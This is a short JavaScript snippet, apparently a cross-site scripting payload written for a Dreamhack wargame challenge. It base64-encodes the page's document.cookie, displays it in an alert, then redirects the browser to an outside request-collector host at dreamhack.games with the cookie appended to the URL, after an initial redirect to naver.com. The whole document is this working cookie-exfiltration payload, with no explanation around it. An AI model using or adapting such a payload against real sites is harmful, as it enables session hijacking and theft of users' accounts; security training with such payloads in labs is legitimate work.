location.href="https://www.naver.com";
let cookie = btoa(document.cookie);
alert(cookie);
setTimeout(()=> {
    location.href = "https://jxqvzrl.request.dreamhack.games/?cookie=" + cookie;
}, 3000);
